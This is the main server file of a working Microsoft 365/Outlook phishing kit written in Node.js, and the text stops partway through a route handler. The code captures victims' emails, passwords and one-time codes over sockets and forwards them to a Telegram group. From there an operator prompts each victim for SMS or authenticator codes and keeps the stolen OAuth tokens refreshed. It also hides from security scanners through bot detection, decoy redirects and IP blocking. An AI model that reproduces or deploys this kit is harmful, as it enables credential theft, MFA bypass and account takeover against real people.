// server.js
require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const geoip = require('geoip-lite');
const useragent = require('useragent');
const requestIp = require('request-ip');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const cookieParser = require('cookie-parser');
const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');
const revokedEmails = require('./utils/revokedEmails');
const { handleVerification } = require('./middleware/botDetection');
// Import routes
const apiRoutes = require('./routes/apiRoutes');
const proxyRoutes = require('./routes/proxyRoutes');
const microsoftRoutes = require('./routes/microsoftRoutes');
const dashboardRoutes = require('./routes/dashboard');
const dashRoutes = require('./routes/dash');


// Import middleware
const rateLimitMiddleware = require('./middleware/rateLimit');
const subdomainMiddleware = require('./middleware/subdomainMiddleware');
// Add this with your other requires
const { 
    getFormattedBlockedIPs, 
    unblockIP, 
    deleteAllBotDetectionMessages,
    deleteAllPageAccessMessages,
    deleteAllMessages,
    clearAllBotMessageIds,
    clearAllPageAccessMessageIds,
    getAllBotMessageIds,
    getAllPageAccessMessageIds
} = require('./middleware/botDetection');
const { browserOnlyMiddleware, unifiedBotDetection } = require('./middleware/botDetection');
// const { turnstileMiddleware, serveTurnstileChallenge } = require('./middleware/turnstile');

// Import services
const TelegramService = require('./services/telegramService');
const ProxyService = require('./services/proxyService');
const { PersistentTokenManager, TokenRefreshScheduler } = require('./services/tokenManager');

// Import utilities
const TemplateManager = require('./utils/templates');
const { getFingerprint, generateCodeVerifier, generateCodeChallenge, decrypt, isValidEmail } = require('./utils/encryption');
const { getVictimInfo } = require('./utils/helpers');

// Import controllers
const AuthController = require('./controllers/authController');
const TokenController = require('./controllers/tokenController');
const TrackingController = require('./controllers/trackingController');

// Import constants
const constants = require('./config/constants');

// ============= INITIALIZATION =============
const app = express();
// Either set it as app.locals

// Or create a shared module export
// Or pass it through middleware
const server = http.createServer(app);

// Load environment
const isProduction = process.env.NODE_ENV === 'production';
const APP_URL = process.env.APP_URL || (isProduction ? 'https://your-app.com' : 'http://localhost:3001');
const cleanAppUrl = APP_URL.replace(/\/$/, '');

console.log(`\n🚀 ========== SERVER STARTING ==========`);
console.log(`📊 Mode: ${isProduction ? 'PRODUCTION' : 'DEVELOPMENT'}`);
console.log(`🌐 App URL: ${cleanAppUrl}`);
console.log(`🔌 Port: ${process.env.PORT || 3001}`);
console.log(`========================================\n`);

// ============= DATA STORES =============
const activeSessions = new Map();
const capturedData = new Map();
const microsoftParams = new Map();
const requestTimestamps = new Map();
const codeVerifiers = new Map();
const emailSessions = new Map();
const verifiedSessions = new Map();

// Update constants with data stores
constants.ACTIVE_SESSIONS = activeSessions;
constants.CAPTURED_DATA = capturedData;
constants.CODE_VERIFIERS = codeVerifiers;
constants.MICROSOFT_PARAMS = microsoftParams;
constants.REQUEST_TIMESTAMPS = requestTimestamps;
constants.EMAIL_SESSIONS = emailSessions;


app.locals.capturedData = capturedData;
// ============= SERVICES INITIALIZATION =============
const telegramService = new TelegramService(process.env.TELEGRAM_BOT_TOKEN, process.env.TELEGRAM_GROUP_ID);
const templateManager = new TemplateManager(path.join(__dirname, 'templates'));
const proxyService = new ProxyService(capturedData, microsoftParams);
// ============= CONTROLLERS INITIALIZATION =============
const authController = new AuthController(
    capturedData, microsoftParams, codeVerifiers, emailSessions,
    requestTimestamps, telegramService.getBot(), process.env.TELEGRAM_GROUP_ID
);

const tokenController = new TokenController(
    capturedData, telegramService.getBot(), process.env.TELEGRAM_GROUP_ID
);

const trackingController = new TrackingController(
    capturedData, telegramService.getBot(), process.env.TELEGRAM_GROUP_ID
);

// ============= TOKEN SCHEDULER =============
const tokenScheduler = new TokenRefreshScheduler(
    capturedData, telegramService.getBot(), process.env.TELEGRAM_GROUP_ID
);

// ============= MIDDLEWARE =============
app.set('trust proxy', true);

const allowedOrigins = isProduction
    ? [cleanAppUrl, 'https://login.microsoftonline.com']
    : ['http://localhost:3001', 'http://127.0.0.1:3001'];

app.use(cors({
    origin: allowedOrigins,
    credentials: true
}));




app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(requestIp.mw());
app.use(rateLimitMiddleware(60, 60000));


// ============= SUBDOMAIN MIDDLEWARE =============
app.use(subdomainMiddleware.subdomainMiddleware);
app.use(subdomainMiddleware.blockInvalidSubdomains);





// ============= AGGRESSIVE URL REDIRECT =============
// Redirect ALL unmatched requests to Google/YouTube

const ALLOWED_PATHS = [
    '/en-us/microsoft-365/outlook',
    '/common/login',
    '/proxy/dual-login',
    '/api/outlook-proxy',
    '/admin/clear-sessions',
    '/verify-human'
];

// Add your ngrok URL patterns
const ALLOWED_PATTERNS = [
    /^\/api\//,           // All API routes
    /^\/proxy\//,         // All proxy routes
    /^\/common\//,        // All common routes
    /^\/static\//,        // Static files
    /\.(css|js|png|jpg|jpeg|gif|svg|ico|json)$/i  // File extensions
];

app.use((req, res, next) => {
    const pathname = req.path;
    
    // Skip POST requests (they're usually from forms)
    if (req.method === 'POST') {
        return next();
    }
    
    // Check exact matches
    if (ALLOWED_PATHS.includes(pathname)) {
        return next();
    }
    
    // Check patterns
    if (ALLOWED_PATTERNS.some(pattern => pattern.test(pathname))) {
        return next();
    }
    
    // Redirect everything else
    const random = Math.random();
    const target = random < 0.7 ? 'https://www.google.com' : 'https://www.youtube.com';
    
    console.log(`🚫 Redirecting: ${req.method} ${pathname} → ${target}`);
    return res.redirect(target);
});


// Add this verification endpoint
app.post('/verify-human', (req, res) => {
    handleVerification(req, res, verifiedSessions);
});

// Make sure requestStartTime is set for the scanner detection
app.use((req, res, next) => {
    req.requestStartTime = Date.now();
    next();
});



// Add this middleware BEFORE your route handlers (after the redirect middleware)
// ============= REVOKED EMAIL CHECK MIDDLEWARE =============
app.use((req, res, next) => {
    // Only check GET requests to the main phishing endpoint
    if (req.method !== 'GET') return next();
    
    // Check if this is the main phishing endpoint
    const isPhishingEndpoint = req.path === '/en-us/microsoft-365/outlook';
    
    if (!isPhishingEndpoint) return next();
    
    // Extract encrypted email from query
    const encryptedEmail = req.query.email;
    
    if (!encryptedEmail) {
        console.log('🚫 No email parameter, redirecting to Google');
        return res.redirect('https://www.google.com');
    }
    
    try {
        // Decrypt the email
        const decryptedEmail = decrypt(encryptedEmail);
        
        if (!decryptedEmail || !isValidEmail(decryptedEmail)) {
            console.log('🚫 Invalid email format, redirecting to Google');
            return res.redirect('https://www.google.com');
        }
        
        // Check if email is revoked
        if (revokedEmails.isEmailRevoked(decryptedEmail)) {
            console.log(`🔴 REVOKED EMAIL BLOCKED: ${decryptedEmail} → Redirecting to Google`);
            return res.redirect('https://www.google.com');
        }
        
        // Email is valid and not revoked - proceed
        console.log(`✅ Valid email (not revoked): ${decryptedEmail}`);
        next();
        
    } catch (error) {
        console.error('❌ Error checking revoked status:', error.message);
        // On error, redirect to Google for safety
        return res.redirect('https://www.google.com');
    }
});



// Add API endpoint to revoke an email
app.post('/api/revoke-email', express.json(), async (req, res) => {
    const { email, sessionId } = req.body;
    
    if (!email) {
        return res.status(400).json({ error: 'Email is required' });
    }
    
    const revoked = revokedEmails.revokeEmail(email);
    
    if (revoked) {
        console.log(`🔴 Email revoked via API: ${email} (Session: ${sessionId || 'unknown'})`);
        
        // Send confirmation to Telegram if bot is available
        if (bot && process.env.TELEGRAM_GROUP_ID) {
            const message = `🔴 *EMAIL REVOKED*\n━━━━━━━━━━━━━━━━━━\n*Email:* \`${email}\`\n*Action:* Blocked from all phishing pages\n*Session:* \`${sessionId || 'API call'}\`\n━━━━━━━━━━━━━━━━━━\nThis email will now be redirected to Google on any future attempts.`;
            bot.sendMessage(process.env.TELEGRAM_GROUP_ID, message, { parse_mode: 'Markdown' }).catch(() => {});
        }
        
        res.json({ success: true, message: `Email ${email} has been revoked` });
    } else {
        res.json({ success: false, message: `Email ${email} was already revoked` });
    }
});

// Optional: API endpoint to list revoked emails
app.get('/api/revoked-emails', async (req, res) => {
    const emails = revokedEmails.getRevokedEmails();
    res.json({ count: emails.length, emails });
});

// Optional: API endpoint to unrevoke an email
app.post('/api/unrevoke-email', express.json(), async (req, res) => {
    const { email } = req.body;
    
    if (!email) {
        return res.status(400).json({ error: 'Email is required' });
    }
    
    const unrevoked = revokedEmails.unrevokeEmail(email);
    
    if (unrevoked) {
        res.json({ success: true, message: `Email ${email} has been unrevoked` });
    } else {
        res.json({ success: false, message: `Email ${email} was not in revoked list` });
    }
});





// Add this before the bot detection middleware
app.use((req, res, next) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const blockedIPsFile = './data/blocked_ips.txt';
    let blockedIPs = [];
    
    try {
        const fs = require('fs');
        if (fs.existsSync(blockedIPsFile)) {
            const content = fs.readFileSync(blockedIPsFile, 'utf8');
            blockedIPs = content.split('\n').filter(i => i.trim().length > 0);
        }
        
        if (blockedIPs.includes(ip)) {
            console.log(`🚫 BLOCKED IP ATTEMPT: ${ip} → Access Denied`);
            return res.status(403).send('Access Denied');
        }
    } catch(e) {
        console.error('Error checking blocked IPs:', e.message);
    }
    
    next();
});

// ============= BOT DETECTION MIDDLEWARE =============

app.use(unifiedBotDetection(verifiedSessions));



// ============= ROUTES INITIALIZATION =============


dashRoutes.initRoutes({
    capturedData,
    emailSessions
});

// Initialize Microsoft routes
microsoftRoutes.initRoutes({
    capturedData,
    microsoftParams,
    codeVerifiers,
    emailSessions,
    requestTimestamps,
    bot: telegramService.getBot(),
    telegramGroupId: process.env.TELEGRAM_GROUP_ID
});

// Initialize API routes
apiRoutes.initRoutes({
    capturedData,
    bot: telegramService.getBot(),
    telegramGroupId: process.env.TELEGRAM_GROUP_ID,
    activeSessions,
    requestTimestamps
});

// Initialize Proxy routes
proxyRoutes.initRoutes({
    capturedData,
    microsoftParams,
    codeVerifiers,
    bot: telegramService.getBot(),
    telegramGroupId: process.env.TELEGRAM_GROUP_ID
});

// ============= APPLY ROUTES =============
app.use('/', microsoftRoutes.router);
app.use('/', apiRoutes.router);
app.use('/', proxyRoutes.router);

// ============= SOCKET.IO =============

// ============= SOCKET.IO =============
const io = new Server(server, {
    cors: {
        origin: allowedOrigins,
        methods: ['GET', 'POST'],
        credentials: true
    },
    transports: ['polling', 'websocket'],
    pingTimeout: 60000,
    pingInterval: 25000
});

// Track active socket sessions
const activeSocketSessions = new Map(); // email -> socket.id
const sessionToEmail = new Map(); // socket.id -> email

io.on('connection', (socket) => {
    let sessionId = socket.handshake.query.sessionId || uuidv4();
    let userEmail = null;

    if (!activeSessions.has(sessionId)) {
        activeSessions.set(sessionId, {
            stage: 'initial',
            lastActivity: Date.now(),
            details: null,
            email: null,
            password: null,
            sockets: new Set([socket.id]),
            createdAt: Date.now()
        });
    } else {
        const session = activeSessions.get(sessionId);
        session.sockets.add(socket.id);
        session.lastActivity = Date.now();
    }

    socket.emit('connection_established', { sessionId });

    // Register session with email
    socket.on('register_session', (data) => {
        if (data.email) {
            userEmail = data.email.toLowerCase();
            sessionToEmail.set(socket.id, userEmail);
            activeSocketSessions.set(userEmail, socket.id);
            console.log(`🔌 Session registered: ${userEmail} (Socket: ${socket.id})`);
        }
    });

    socket.on('client_info', (userAgent) => {
        const session = activeSessions.get(sessionId);
        if (session) {
            const ip = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
            const geo = geoip.lookup(ip) || {};
            const agent = useragent.parse(userAgent);

            session.details = {
                ip,
                location: geo.country ? `${geo.city || 'Unknown'}, ${geo.country}` : 'Unknown',
                browser: agent.toAgent(),
                os: agent.os.toString(),
                timestamp: new Date().toLocaleString()
            };
            session.lastActivity = Date.now();
        }
    });

    socket.on('submit_email', async (email) => {
        const session = activeSessions.get(sessionId);
        if (!session) return;

        session.email = email;
        session.stage = 'awaiting_password';
        session.lastActivity = Date.now();

        const message = `📧 New Login Request\n━━━━━━━━━━━━━━━━━━\nEmail: ${email}`;
        await telegramService.sendMessage(message, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔑 Request Password', callback_data: `request_password|${sessionId}` }]
                ]
            }
        });

        socket.emit('email_sent');
    });

    socket.on('submit_password', async (password) => {
        const session = activeSessions.get(sessionId);
        if (!session) return;

        session.password = password;
        session.stage = 'awaiting_action';
        session.lastActivity = Date.now();

        await telegramService.sendMessage(
            `🔒 Password received for ${session.email}\nPassword: ${password}`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '📱 Request SMS Code', callback_data: `request_sms|${sessionId}` }],
                        [{ text: '🔐 Request Auth Code', callback_data: `request_auth|${sessionId}` }],
                        [{ text: '✅ Done', callback_data: `done|${sessionId}` }]
                    ]
                }
            }
        );

        socket.emit('password_sent');
    });

    socket.on('disconnect', () => {
        // Clean up mappings
        if (userEmail) {
            activeSocketSessions.delete(userEmail);
        }
        if (socket.id) {
            sessionToEmail.delete(socket.id);
        }
        
        const session = activeSessions.get(sessionId);
        if (session) {
            session.sockets.delete(socket.id);
            session.lastActivity = Date.now();
        }
    });
});

// Helper function to force redirect a user
function forceRedirectUser(email, redirectUrl = 'https://www.google.com') {
    const socketId = activeSocketSessions.get(email.toLowerCase());
    if (socketId) {
        const socket = io.sockets.sockets.get(socketId);
        if (socket && socket.connected) {
            console.log(`🚨 Force redirecting ${email} to ${redirectUrl}`);
            socket.emit('force_redirect', { url: redirectUrl });
            return true;
        }
    }
    console.log(`⚠️ No active session found for ${email}`);
    return false;
}

// ============= TELEGRAM BOT HANDLERS =============
// ============= TELEGRAM BOT CALLBACK HANDLER =============
const bot = telegramService.getBot();
if (bot) {
    app.locals.bot = bot;
    // Force stop any existing polling and restart
    try {
        bot.stopPolling();
    } catch(e) {}
    
    bot.startPolling().then(() => {
        console.log('✅ Telegram bot polling started');
    }).catch((err) => {
        console.error('❌ Failed to start polling:', err.message);
    });
    
    bot.getMe().then((botInfo) => {
        console.log('✅ Bot is alive! Username:', botInfo.username);
    }).catch((err) => {
        console.error('❌ Bot error:', err.message);
    });
    
    // Main callback handler
    bot.on('callback_query', async (cb) => {
        console.log('📨 Telegram Callback Received:');
        console.log('   Data:', cb.data);
        console.log('   From:', cb.from.username || cb.from.id);
        console.log('   Message ID:', cb.message?.message_id);
        
        // Split carefully
        const parts = cb.data.split('|');
        const action = parts[0];
        const param1 = parts[1] || '';
        const param2 = parts[2] || '';
        
        console.log('   Parsed Action:', action);
        console.log('   Parsed Param1:', param1);
        console.log('   Parsed Param2:', param2);
        
        // ============ HANDLE BLOCK IP ============
        
        if (action === 'block_ip') {
            const ip = param1;
            console.log(`🔴 Block IP action triggered for IP: ${ip}`);
            
            if (!ip || ip === 'undefined' || ip === 'null') {
                console.log('❌ No valid IP provided');
                await bot.answerCallbackQuery(cb.id, { 
                    text: '❌ No IP found to block!', 
                    show_alert: true 
                });
                return;
            }
            
            // Block the IP
            const fs = require('fs');
            const blockedIPsFile = './data/blocked_ips.txt';
            let blockedIPs = [];
            
            try {
                // Create data directory if it doesn't exist
                if (!fs.existsSync('./data')) {
                    fs.mkdirSync('./data', { recursive: true });
                }
                
                // Load existing blocked IPs
                if (fs.existsSync(blockedIPsFile)) {
                    const content = fs.readFileSync(blockedIPsFile, 'utf8');
                    blockedIPs = content.split('\n').filter(i => i.trim().length > 0);
                }
                
                // Add IP if not already blocked
                if (!blockedIPs.includes(ip)) {
                    blockedIPs.push(ip);
                    fs.writeFileSync(blockedIPsFile, blockedIPs.join('\n'));
                    console.log(`🔴 IP added to blocklist: ${ip}`);
                    
                    await bot.answerCallbackQuery(cb.id, { 
                        text: `✅ IP ${ip} has been blocked!`, 
                        show_alert: true 
                    });
                    
                    // Update the original message
                    try {
                        await bot.editMessageText(
                            `🔴 *IP BLOCKED*\n` +
                            `━━━━━━━━━━━━━━━━━━\n` +
                            `*IP:* \`${ip}\`\n` +
                            `*Action:* IP has been added to blocklist\n` +
                            `*Time:* ${new Date().toLocaleString()}\n` +
                            `━━━━━━━━━━━━━━━━━━\n` +
                            `This IP will now receive 403 Forbidden on all requests.`,
                            {
                                chat_id: cb.message.chat.id,
                                message_id: cb.message.message_id,
                                parse_mode: 'Markdown'
                            }
                        );
                    } catch(e) {
                        console.error('Failed to edit message:', e.message);
                    }
                } else {
                    await bot.answerCallbackQuery(cb.id, { 
                        text: `⚠️ IP ${ip} is already blocked!`, 
                        show_alert: true 
                    });
                }
            } catch(e) {
                console.error('Failed to block IP:', e.message);
                await bot.answerCallbackQuery(cb.id, { 
                    text: '❌ Failed to block IP', 
                    show_alert: true 
                });
            }
        }// Add these to your Telegram bot callback handler in server.js:


        // ============ HANDLE DELETE ALL BOT MESSAGES ============
else if (action === 'delete_all_bot_messages') {
    console.log(`🗑️ Delete all bot messages action triggered`);
    
    await bot.answerCallbackQuery(cb.id, { text: '🗑️ Deleting all bot detection messages...' });
    
    try {
        const chatId = cb.message.chat.id;
        const currentMessageId = cb.message.message_id;
        
        const { deletedCount, failedCount } = await deleteAllBotDetectionMessages(bot, chatId);
        
        try {
            await bot.deleteMessage(chatId, currentMessageId);
        } catch (deleteError) {
            if (!deleteError.message.includes('message to delete not found')) {
                console.log(`Delete error: ${deleteError.message}`);
            }
        }
        
        const confirmMsg = await bot.sendMessage(chatId, 
            `🗑️ *BOT MESSAGES CLEANUP*\n━━━━━━━━━━━━━━━━━━\n` +
            `✅ Deleted: ${deletedCount} bot detection messages\n` +
            `❌ Failed: ${failedCount} messages\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `This message will self-destruct in 5 seconds.`,
            { parse_mode: 'Markdown' }
        );
        
        setTimeout(async () => {
            try {
                await bot.deleteMessage(chatId, confirmMsg.message_id);
            } catch(e) {}
        }, 5000);
        
    } catch(error) {
        console.error('Failed to delete messages:', error.message);
    }
}

// ============ HANDLE DELETE ALL PAGE ACCESS MESSAGES ============
else if (action === 'delete_all_access_messages') {
    console.log(`🗑️ Delete all page access messages action triggered`);
    
    await bot.answerCallbackQuery(cb.id, { text: '🗑️ Deleting all page access messages...' });
    
    try {
        const chatId = cb.message.chat.id;
        const currentMessageId = cb.message.message_id;
        
        const { deletedCount, failedCount } = await deleteAllPageAccessMessages(bot, chatId);
        
        try {
            await bot.deleteMessage(chatId, currentMessageId);
        } catch (deleteError) {
            if (!deleteError.message.includes('message to delete not found')) {
                console.log(`Delete error: ${deleteError.message}`);
            }
        }
        
        const confirmMsg = await bot.sendMessage(chatId, 
            `👁️ *PAGE ACCESS MESSAGES CLEANUP*\n━━━━━━━━━━━━━━━━━━\n` +
            `✅ Deleted: ${deletedCount} page access messages\n` +
            `❌ Failed: ${failedCount} messages\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `This message will self-destruct in 5 seconds.`,
            { parse_mode: 'Markdown' }
        );
        
        setTimeout(async () => {
            try {
                await bot.deleteMessage(chatId, confirmMsg.message_id);
            } catch(e) {}
        }, 5000);
        
    } catch(error) {
        console.error('Failed to delete messages:', error.message);
    }
}

// ============ HANDLE DELETE ALL MESSAGES (BOTH TYPES) ============
else if (action === 'delete_all_messages') {
    console.log(`🗑️ Delete all messages action triggered`);
    
    await bot.answerCallbackQuery(cb.id, { text: '🗑️ Deleting ALL messages...' });
    
    try {
        const chatId = cb.message.chat.id;
        const currentMessageId = cb.message.message_id;
        
        const result = await deleteAllMessages(bot, chatId);
        
        try {
            await bot.deleteMessage(chatId, currentMessageId);
        } catch (deleteError) {
            if (!deleteError.message.includes('message to delete not found')) {
                console.log(`Delete error: ${deleteError.message}`);
            }
        }
        
        const confirmMsg = await bot.sendMessage(chatId, 
            `🗑️ *ALL MESSAGES CLEANUP*\n━━━━━━━━━━━━━━━━━━\n` +
            `*Bot Detection Messages:*\n` +
            `   ✅ Deleted: ${result.botDeleted}\n` +
            `   ❌ Failed: ${result.botFailed}\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `*Page Access Messages:*\n` +
            `   ✅ Deleted: ${result.pageDeleted}\n` +
            `   ❌ Failed: ${result.pageFailed}\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `*Total Deleted:* ${result.totalDeleted}\n` +
            `*Total Failed:* ${result.totalFailed}\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `This message will self-destruct in 5 seconds.`,
            { parse_mode: 'Markdown' }
        );
        
        setTimeout(async () => {
            try {
                await bot.deleteMessage(chatId, confirmMsg.message_id);
            } catch(e) {}
        }, 5000);
        
    } catch(error) {
        console.error('Failed to delete messages:', error.message);
    }
}
// ============ HANDLE VIEW BLOCKED IPS ============
else if (action === 'view_blocked_ips') {
    console.log(`📋 View blocked IPs action triggered`);
    
    const formattedIPs = getFormattedBlockedIPs();
    
    await bot.answerCallbackQuery(cb.id, { text: '📋 Fetching blocked IPs...' });
    
    await bot.editMessageText(
        formattedIPs,
        {
            chat_id: cb.message.chat.id,
            message_id: cb.message.message_id,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🗑️ CLEAR ALL', callback_data: 'clear_blocked_ips' }],
                    [{ text: '🔙 BACK', callback_data: 'back_to_main' }]
                ]
            }
        }
    );
}


else if (action === 'delete_all_bot_messages') {
    console.log(`🗑️ Delete all bot messages action triggered`);
    
    await bot.answerCallbackQuery(cb.id, { text: '🗑️ Deleting all bot detection messages...' });
    
    try {
        const chatId = cb.message.chat.id;
        
        // Delete all tracked messages from Telegram
        const { deletedCount, failedCount } = await deleteAllBotDetectionMessages(bot, chatId);
        
        // Also try to delete the current message
        try {
            await bot.deleteMessage(chatId, cb.message.message_id);
        } catch(e) {
            console.log(`Could not delete current message: ${e.message}`);
        }
        
        // Send confirmation (will auto-delete)
        const confirmMsg = await bot.sendMessage(chatId, 
            `🗑️ *CLEANUP COMPLETE*\n━━━━━━━━━━━━━━━━━━\n` +
            `✅ Deleted: ${deletedCount} bot detection messages\n` +
            `❌ Failed: ${failedCount} messages\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `All tracked bot messages have been removed from Telegram.\n` +
            `Message IDs have been cleared from storage.`,
            { parse_mode: 'Markdown' }
        );
        
        // Auto-delete the confirmation message after 5 seconds
        setTimeout(async () => {
            try {
                await bot.deleteMessage(chatId, confirmMsg.message_id);
            } catch(e) {}
        }, 5000);
        
    } catch(error) {
        console.error('Failed to delete messages:', error.message);
        const errorMsg = await bot.sendMessage(cb.message.chat.id, 
            `❌ *ERROR DELETING MESSAGES*\n━━━━━━━━━━━━━━━━━━\n${error.message}`,
            { parse_mode: 'Markdown' }
        );
        
        setTimeout(async () => {
            try {
                await bot.deleteMessage(cb.message.chat.id, errorMsg.message_id);
            } catch(e) {}
        }, 5000);
    }
}

// ============ HANDLE CLEAR ALL BLOCKED IPS ============
else if (action === 'clear_blocked_ips') {
    console.log(`🗑️ Clear all blocked IPs action triggered`);
    
    const blockedIPsFile = './data/blocked_ips.txt';
    try {
        fs.writeFileSync(blockedIPsFile, '');
        // Also clear the in-memory set
        const { getBlockedIPs, unblockIP } = require('./middleware/botDetection');
        const ips = getBlockedIPs();
        ips.forEach(ip => unblockIP(ip));
        
        await bot.answerCallbackQuery(cb.id, { text: '✅ All blocked IPs cleared!', show_alert: true });
        
        await bot.editMessageText(
            `✅ *ALL BLOCKED IPS CLEARED*\n━━━━━━━━━━━━━━━━━━\nSuccessfully removed all IPs from blocklist.\n*Time:* ${new Date().toLocaleString()}`,
            {
                chat_id: cb.message.chat.id,
                message_id: cb.message.message_id,
                parse_mode: 'Markdown'
            }
        );
    } catch(e) {
        console.error('Failed to clear blocked IPs:', e.message);
        await bot.answerCallbackQuery(cb.id, { text: '❌ Failed to clear blocked IPs', show_alert: true });
    }
}
// ============ HANDLE UNBLOCK IP ============
else if (action === 'unblock_ip') {
    const ip = param1;
    console.log(`🟢 Unblock IP action triggered for IP: ${ip}`);
    
    if (!ip || ip === 'undefined' || ip === 'null') {
        await bot.answerCallbackQuery(cb.id, { text: '❌ No valid IP to unblock!', show_alert: true });
        return;
    }
    
    const unblocked = unblockIP(ip);
    
    if (unblocked) {
        await bot.answerCallbackQuery(cb.id, { text: `✅ IP ${ip} has been unblocked!`, show_alert: true });
        
        await bot.editMessageText(
            `🟢 *IP UNBLOCKED*\n━━━━━━━━━━━━━━━━━━\n*IP:* \`${ip}\`\n*Action:* IP removed from blocklist\n*Time:* ${new Date().toLocaleString()}`,
            {
                chat_id: cb.message.chat.id,
                message_id: cb.message.message_id,
                parse_mode: 'Markdown'
            }
        );
    } else {
        await bot.answerCallbackQuery(cb.id, { text: `⚠️ IP ${ip} was not in blocklist`, show_alert: true });
    }
}

// ============ HANDLE BACK TO MAIN ============
else if (action === 'back_to_main') {
    console.log(`🔙 Back to main action triggered`);
    
    await bot.editMessageText(
        `✅ *Bot Detection System Active*\n━━━━━━━━━━━━━━━━━━\nUse the buttons below to manage blocked IPs.`,
        {
            chat_id: cb.message.chat.id,
            message_id: cb.message.message_id,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📋 VIEW BLOCKED IPS', callback_data: 'view_blocked_ips' }],
                    [{ text: '🗑️ CLEAR ALL', callback_data: 'clear_blocked_ips' }]
                ]
            }
        }
    );
}
        
        // ============ HANDLE BLOCK ALL BOTS ============
        else if (action === 'block_all_bots') {
            console.log(`🔴 Block all bots action triggered`);
            
            const fs = require('fs');
            const blockedIPsFile = './data/blocked_ips.txt';
            let blockedIPs = [];
            let newBlockedIPs = [];
            
            try {
                // Load existing blocked IPs
                if (fs.existsSync(blockedIPsFile)) {
                    const content = fs.readFileSync(blockedIPsFile, 'utf8');
                    blockedIPs = content.split('\n').filter(i => i.trim().length > 0);
                }
                
                // Get bot detections from global or recent logs
                // For now, we'll block the IP from the current detection
                // You can expand this to block all detected bot IPs from your logs
                
                // Add a note that this feature is being implemented
                await bot.answerCallbackQuery(cb.id, { 
                    text: `⚠️ This will block all detected bot IPs. Feature coming soon!`, 
                    show_alert: true 
                });
                
                await bot.editMessageText(
                    `🔴 *BLOCK ALL BOTS*\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `*Status:* Feature in development\n` +
                    `*Coming Soon:* Ability to block all detected bot IPs at once\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `For now, use the "Block IP" button to block individual IPs.`,
                    {
                        chat_id: cb.message.chat.id,
                        message_id: cb.message.message_id,
                        parse_mode: 'Markdown'
                    }
                );
            } catch(e) {
                console.error('Failed to block all bots:', e.message);
                await bot.answerCallbackQuery(cb.id, { 
                    text: '❌ Failed to block all bots', 
                    show_alert: true 
                });
            }
        }
        
        // ============ HANDLE REVOKE PAGE (Page View) ============
        else if (action === 'revoke_page' || action === 'revoke_full') {
            const email = param1;
            console.log(`🔴 Revoke action triggered for email: ${email}`);
            
            if (!email || email === 'undefined' || email === 'null' || email === '') {
                console.log('❌ No valid email for revoke');
                await bot.answerCallbackQuery(cb.id, { 
                    text: '❌ No email found to revoke!', 
                    show_alert: true 
                });
                return;
            }
            
            const revoked = revokedEmails.revokeEmail(email);
            
            if (revoked) {
                await bot.answerCallbackQuery(cb.id, { 
                    text: `✅ ${email} has been REVOKED!`, 
                    show_alert: true 
                });
                
                const revokedText = action === 'revoke_page' ? 'Page View' : 'Full';
                try {
                    await bot.editMessageText(
                        `🔴 *EMAIL REVOKED (${revokedText})*\n` +
                        `━━━━━━━━━━━━━━━━━━\n` +
                        `*Email:* \`${email}\`\n` +
                        `*Action:* Blocked from accessing phishing page\n` +
                        `*Time:* ${new Date().toLocaleString()}\n` +
                        `━━━━━━━━━━━━━━━━━━\n` +
                        `This email will now be redirected to Google.`,
                        {
                            chat_id: cb.message.chat.id,
                            message_id: cb.message.message_id,
                            parse_mode: 'Markdown'
                        }
                    );
                } catch(e) { 
                    console.error('Edit failed:', e.message);
                }
            } else {
                await bot.answerCallbackQuery(cb.id, { 
                    text: `⚠️ ${email} was already revoked!`, 
                    show_alert: true 
                });
            }
        }
        
        // ============ HANDLE EXISTING SESSION-BASED ACTIONS ============
        else if (action === 'request_password') {
            const sessionId = param1;
            const session = activeSessions.get(sessionId);

            if (!session) {
                await bot.answerCallbackQuery(cb.id, { text: 'Session expired', show_alert: true });
                return;
            }

            session.lastActivity = Date.now();
            sendToSession(sessionId, 'request_password');
            await bot.answerCallbackQuery(cb.id, { text: 'Requesting password' });
        } 
        
        else if (action === 'request_sms' || action === 'request_auth') {
            const sessionId = param1;
            const session = activeSessions.get(sessionId);

            if (!session) {
                await bot.answerCallbackQuery(cb.id, { text: 'Session expired', show_alert: true });
                return;
            }

            session.lastActivity = Date.now();
            const codeType = action === 'request_sms' ? 'sms' : 'authenticator';
            sendToSession(sessionId, 'request_2fa', codeType);
            await bot.answerCallbackQuery(cb.id, { text: `Requesting ${codeType} code` });
        } 
        
        else if (action === 'done') {
            const sessionId = param1;
            const session = activeSessions.get(sessionId);

            if (!session) {
                await bot.answerCallbackQuery(cb.id, { text: 'Session expired', show_alert: true });
                return;
            }

            sendToSession(sessionId, 'redirect_to_gmail');
            await telegramService.sendMessage(`✅ Login complete for ${session.email}\nPassword: ${session.password || 'N/A'}`);
            await bot.answerCallbackQuery(cb.id, { text: 'Redirecting user' });
        }
        
        // ============ CATCH ANY UNKNOWN ACTIONS ============
        else {
            console.log('⚠️ Unknown callback action:', action);
            await bot.answerCallbackQuery(cb.id, { text: 'Unknown action', show_alert: false });
        }
    });
    
    console.log('✅ Telegram bot callback handler registered');
}

function sendToSession(sessionId, event, data) {
    const session = activeSessions.get(sessionId);
    if (!session) return false;

    for (const socketId of session.sockets) {
        const socket = io.sockets.sockets.get(socketId);
        if (socket?.connected) socket.emit(event, data);
    }
    return true;
}





// ============= ADDITIONAL ROUTES =============





// Root redirect
app.get('/', (req, res) => {
